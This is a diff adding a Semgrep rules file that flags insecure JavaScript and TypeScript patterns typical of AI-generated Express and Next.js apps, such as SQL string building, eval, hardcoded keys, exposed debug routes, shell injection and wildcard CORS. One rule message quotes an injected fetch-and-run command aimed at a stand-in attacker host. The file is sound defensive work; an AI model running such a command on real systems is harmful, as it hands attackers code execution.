@@ -1,0 +1,317 @@
+# =============================================================================
+# vibe_patterns_js.yaml -- JavaScript/TypeScript counterparts to vibe_patterns.yaml
+# =============================================================================
+#
+# WHY THIS FILE EXISTS
+#   The Python rules cannot be reused. Semgrep patterns are concrete syntax, and
+#   the antipatterns look nothing alike across the two languages: Python builds
+#   SQL with f-strings, JavaScript with template literals; Python shells out via
+#   subprocess(shell=True), JavaScript via child_process.exec. A rule carrying
+#   `languages: [python, javascript]` must have patterns valid in both, which
+#   these are not.
+#
+#   It matters because most people shipping AI-generated products are shipping
+#   Next.js and Express, not Flask. Measured on a typical vibe-coded Express app,
+#   `--config auto` found eval, XSS and child_process -- and missed
+#       "SELECT * FROM users WHERE id = " + req.query.id
+#   which is the single most common bug in the category. Same gap the Python
+#   rules were written to close, same reason: the registry is tuned for code
+#   written by people who knew the rules existed.
+#
+# HOW TO RUN
+#   Both rule files at once, by pointing at the directory:
+#     semgrep --config rules/ --json <target>
+#     python analyze.py <target> --config auto --config rules/
+#
+# TYPESCRIPT IS INCLUDED BY LISTING IT
+#   Semgrep treats typescript as a separate language even though the syntax is a
+#   superset. Every rule lists both, or .ts and .tsx files are silently skipped
+#   -- silently, which is the dangerous part.
+# =============================================================================
+
+rules:
+
+  # ===========================================================================
+  # RULE 1 -- SQL built by string concatenation or template literal
+  # ===========================================================================
+  # WHY THE INTERPOLATION IS REQUIRED IN THE PATTERN
+  #   `db.query(`SELECT * FROM users`)` is a template literal with no
+  #   substitution -- the developer chose every byte, so there is no injection
+  #   point. Matching every backtick string would flag it, and JavaScript uses
+  #   backticks for ordinary strings constantly. The `${...}` in the pattern is
+  #   what separates "string that happens to use backticks" from "string built
+  #   from something else at runtime".
+  - id: vibe-js-sql-string-building
+    languages: [javascript, typescript]
+    severity: ERROR
+    message: >-
+      SQL query built by string concatenation or template interpolation. Any
+      attacker-controlled value in this string is parsed as SQL, not as data --
+      classic injection. Use a parameterised query instead:
+      db.query("SELECT ... WHERE id = ?", [value])
+    metadata:
+      category: security
+      cwe: "CWE-89: SQL Injection"
+      vibe-reason: "Template literals are the idiomatic way to build any string in modern JS, and the model applies that idiom to SQL too."
+    # WHY THE CONCATENATION BRANCHES MATCH ON A SQL KEYWORD, NOT ON SHAPE
+    #   The first draft used `"..." + $X`, which failed on the most common line
+    #   in the whole category:
+    #       const q = "SELECT ... LIKE '%" + req.query.term + "%'";
+    #   Three-part concatenation parses as ("..." + x) + "...", so the outer
+    #   left operand is a binary expression, not a string literal, and the
+    #   pattern cannot match. Adding a three-part variant would then fail on
+    #   four parts.
+    #
+    #   Matching `$A + $B` and requiring a SQL verb inside $A fixes it for every
+    #   arity at once: $A absorbs the whole left-nested subtree, and Semgrep
+    #   regexes the matched source text, so the keyword is found wherever in
+    #   that subtree it sits.
+    patterns:
+      - pattern-either:
+          # Direct: interpolation happens inside the call.
+          - pattern: $DB.query(`...${...}...`, ...)
+          - pattern: $DB.execute(`...${...}...`, ...)
+          - pattern: $DB.raw(`...${...}...`, ...)
+          # Prisma's explicitly-unsafe escape hatches. The name is the warning.
+          - pattern: $DB.$queryRawUnsafe(...)
+          - pattern: $DB.$executeRawUnsafe(...)
+          # Direct: concatenation inside the call.
+          - patterns:
+              - pattern-either:
+                  - pattern: $DB.query($A + $B, ...)
+                  - pattern: $DB.execute($A + $B, ...)
+                  - pattern: $DB.raw($A + $B, ...)
+              - metavariable-regex:
+                  metavariable: $A
+                  # metavariable-regex must match the metavariable's text in FULL,
+                  # not merely find the keyword within it -- hence the wrapping .*
+                  # -- and (?s) lets . cross newlines, because a long concatenated
+                  # query is usually split across several lines.
+                  regex: (?is).*\b(select|insert|update|delete|from|where)\b.*
+          # Two-step: built into a variable, executed later. This is how an LLM
+          # usually formats it, because it reads more cleanly.
+          - pattern: |
+              $Q = `...${...}...`;
+              ...
+              $DB.query($Q, ...);
+          - patterns:
+              - pattern-either:
+                  - pattern: |
+                      $Q = $A + $B;
+                      ...
+                      $DB.query($Q, ...);
+                  - pattern: |
+                      $Q = $A + $B;
+                      ...
+                      $DB.execute($Q, ...);
+              - metavariable-regex:
+                  metavariable: $A
+                  # metavariable-regex must match the metavariable's text in FULL,
+                  # not merely find the keyword within it -- hence the wrapping .*
+                  # -- and (?s) lets . cross newlines, because a long concatenated
+                  # query is usually split across several lines.
+                  regex: (?is).*\b(select|insert|update|delete|from|where)\b.*
+
+  # ===========================================================================
+  # RULE 2 -- eval() or Function() on anything that is not a literal
+  # ===========================================================================
+  #   eval("2 + 2") is pointless but harmless. eval(req.query.expr) is remote
+  #   code execution. The pattern-not clauses encode exactly that difference,
+  #   which is what stops the rule firing on every eval in a codebase.
+  #
+  #   `new Function(str)` is the one people forget: it is eval wearing a
+  #   constructor, and it is what a model reaches for when told to avoid eval.
+  - id: vibe-js-eval-on-variable
+    languages: [javascript, typescript]
+    severity: ERROR
+    message: >-
+      eval() or new Function() called on a variable. If that value can be
+      influenced by a request, this is remote code execution -- the attacker runs
+      whatever they like in your process. Parse the value instead of executing it.
+    metadata:
+      category: security
+      cwe: "CWE-95: Eval Injection"
+      vibe-reason: "'Build a calculator endpoint' has a three-line answer using eval and a fifty-line answer that writes a parser."
+    patterns:
+      - pattern-either:
+          - pattern: eval($X)
+          - pattern: new Function($X)
+          - pattern: $VM.runInNewContext($X, ...)
+          - pattern: $VM.runInThisContext($X, ...)
+      - pattern-not: eval("...")
+      - pattern-not: new Function("...")
+      - pattern-not: $VM.runInNewContext("...", ...)
+      - pattern-not: $VM.runInThisContext("...", ...)
+
+  # ===========================================================================
+  # RULE 3 -- Credential-looking name assigned a hardcoded string
+  # ===========================================================================
+  #   Both the declaration form (const API_KEY = "...") and the object-property
+  #   form ({ apiKey: "..." }) are covered, because configuration objects are
+  #   where JavaScript actually puts these.
+  - id: vibe-js-hardcoded-secret-by-name
+    languages: [javascript, typescript]
+    severity: ERROR
+    message: >-
+      Credential-looking name assigned a hardcoded string. Once committed this is
+      in Git history permanently -- deleting the line later does not remove it,
+      and keys pushed to public repos are scraped within minutes. Read it from
+      process.env instead, and rotate this value; treat it as compromised.
+    metadata:
+      category: security
+      cwe: "CWE-798: Use of Hard-coded Credentials"
+      vibe-reason: "A self-contained runnable snippet needs the key inline to work."
+    patterns:
+      - pattern-either:
+          - pattern: var $NAME = $VALUE
+          - pattern: let $NAME = $VALUE
+          - pattern: const $NAME = $VALUE
+          - pattern: $NAME = $VALUE
+          - pattern: '{ ..., $NAME: $VALUE, ... }'
+      - metavariable-regex:
+          metavariable: $NAME
+          regex: (?i).*(api_?key|secret|password|passwd|pwd|token|credential|auth_?key|access_?key).*
+      - metavariable-regex:
+          metavariable: $VALUE
+          # Backtick included: JS string literals come in three flavours.
+          regex: ^["'`][^"'`]{6,}["'`]$
+      # Reading from the environment is the fix, not the bug. A rule that still
+      # fires after you fix the problem trains people to ignore it.
+      - pattern-not: $NAME = process.env.$ANY
+      - pattern-not: $NAME = process.env[...]
+      - pattern-not: $NAME = import.meta.env.$ANY
+
+  # ===========================================================================
+  # RULE 4 -- String literal matching a known credential format
+  # ===========================================================================
+  #   Name-based detection misses `const k = "sk-live-..."`. Format-based
+  #   detection misses `const apiKey = "correct horse battery staple"`. Running
+  #   both is what covers the space; the overlap is collapsed by analyze.py's
+  #   dedupe, which keys on (file, line).
+  - id: vibe-js-hardcoded-secret-by-format
+    languages: [javascript, typescript]
+    severity: ERROR
+    message: >-
+      String literal matches a known credential format (OpenAI/Anthropic key, AWS
+      key, GitHub token, Stripe live key, Bearer token, or private key block).
+      Move it to an environment variable and rotate the value.
+    metadata:
+      category: security
+      cwe: "CWE-798: Use of Hard-coded Credentials"
+      vibe-reason: "Models paste realistic-looking example keys that developers then replace with real ones."
+    patterns:
+      - pattern-either:
+          - pattern: var $NAME = $VALUE
+          - pattern: let $NAME = $VALUE
+          - pattern: const $NAME = $VALUE
+          - pattern: $NAME = $VALUE
+          - pattern: '{ ..., $NAME: $VALUE, ... }'
+      - metavariable-regex:
+          metavariable: $VALUE
+          regex: ^["'`](sk-[A-Za-z0-9_\-]{8,}|sk_live_[A-Za-z0-9]{8,}|AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{20,}|xox[abprs]-[A-Za-z0-9\-]{10,}|Bearer\s+[A-Za-z0-9_\-\.]{16,}|-----BEGIN[A-Z ]*PRIVATE KEY-----.*)["'`]$
+
+  # ===========================================================================
+  # RULE 5 -- Route handler exposing process or filesystem internals
+  # ===========================================================================
+  # THE SAME DELIBERATE NARROWING AS THE PYTHON RULE -- READ THIS
+  #   The obvious version is "flag every route with no auth". Don't write that
+  #   rule: most routes are legitimately public, so it fires on nearly every
+  #   handler and gets switched off within a day. It is worse than no rule,
+  #   because it also buries the true positives.
+  #
+  #   So this narrows to handlers that touch something sensitive. It costs
+  #   coverage -- an unauthenticated /delete-all-users will NOT be caught, since
+  #   deleting users matches no sensitive-read pattern below. Known limitation,
+  #   stated rather than papered over.
+  #
+  #   $METHOD is constrained by regex because an unconstrained `$APP.$METHOD(...)`
+  #   matches any method call with arguments, including console.log, which would
+  #   make the rule fire across the whole file.
+  - id: vibe-js-debug-route-exposes-internals
+    languages: [javascript, typescript]
+    severity: ERROR
+    message: >-
+      Route handler that exposes process or filesystem internals. process.env
+      leaks every secret the process holds; directory listings hand an attacker a
+      map of the deployment. "Nobody knows the URL" is not a control -- /debug and
+      /admin are in every scanner wordlist. Delete it, or gate it behind both an
+      auth check and a NODE_ENV check.
+    metadata:
+      category: security
+      cwe: "CWE-200: Exposure of Sensitive Information"
+      vibe-reason: "Models add debug endpoints when asked for debuggability, with no prod/dev gate."
+    patterns:
+      - pattern-inside: $APP.$METHOD("...", ...)
+      - metavariable-regex:
+          metavariable: $METHOD
+          regex: ^(get|post|put|patch|delete|all)$
+      - pattern-either:
+          - pattern: $RES.json(process.env)
+          - pattern: $RES.send(process.env)
+          - pattern: $RES.json(process.env.$ANY)
+          - pattern: $RES.send(process.env.$ANY)
+          - pattern: $FS.readdirSync(...)
+          - pattern: $FS.readdir(...)
+          - pattern: process.cwd()
+
+  # ===========================================================================
+  # RULE 6 -- Shell command built from a variable
+  # ===========================================================================
+  #   exec() takes a command *string* and hands it to a shell, so shell syntax in
+  #   any interpolated value is executed. execFile() and spawn() take an argument
+  #   array and do not involve a shell at all -- which is why the fix is to switch
+  #   functions, not to escape harder.
+  - id: vibe-js-command-injection
+    languages: [javascript, typescript]
+    severity: ERROR
+    message: >-
+      Shell command built from a variable. If any part of it is user-controlled,
+      an attacker appends "; curl evil.com/sh | sh" and runs arbitrary commands as
+      your app's user. Use execFile() or spawn() with an argument array -- with no
+      shell involved there is no shell syntax to inject.
+    metadata:
+      category: security
+      cwe: "CWE-78: OS Command Injection"
+      vibe-reason: "exec() with a template literal is what makes a one-line shell example work."
+    patterns:
+      - pattern-either:
+          - pattern: $CP.exec($CMD, ...)
+          - pattern: $CP.execSync($CMD, ...)
+          - pattern: exec($CMD, ...)
+          - pattern: execSync($CMD, ...)
+          - pattern: '$CP.spawn($CMD, ..., {..., shell: true, ...})'
+          - pattern: '$CP.spawnSync($CMD, ..., {..., shell: true, ...})'
+      # A fully hardcoded command has no injection point.
+      - pattern-not: $CP.exec("...", ...)
+      - pattern-not: $CP.execSync("...", ...)
+      - pattern-not: exec("...", ...)
+      - pattern-not: execSync("...", ...)
+
+  # ===========================================================================
+  # RULE 7 -- CORS wildcard
+  # ===========================================================================
+  #   engines/config.py catches the configuration-file forms of this. This rule
+  #   catches the code forms, which is where Express apps actually set it.
+  #
+  #   The origin:true + credentials:true combination is worse than a bare
+  #   wildcard and looks more innocent: it reflects whatever Origin the request
+  #   carried and permits cookies, so any site can read authenticated responses
+  #   as the visitor. Browsers refuse the literal "*" with credentials, which is
+  #   exactly why people reach for `true` instead.
+  - id: vibe-js-cors-wildcard
+    languages: [javascript, typescript]
+    severity: WARNING
+    message: >-
+      CORS configured to allow any origin. Any website can then read authenticated
+      responses from your API using a visitor's session. List the origins you
+      actually serve instead.
+    metadata:
+      category: security
+      cwe: "CWE-942: Overly Permissive Cross-domain Policy"
+      vibe-reason: "Wildcard CORS is the fastest way to make a local front-end stop erroring, and it ships that way."
+    patterns:
+      - pattern-either:
+          - pattern: $RES.setHeader("Access-Control-Allow-Origin", "*")
+          - pattern: $RES.header("Access-Control-Allow-Origin", "*")
+          - pattern: 'cors({..., origin: "*", ...})'
+          - pattern: 'cors({..., origin: true, ..., credentials: true, ...})'
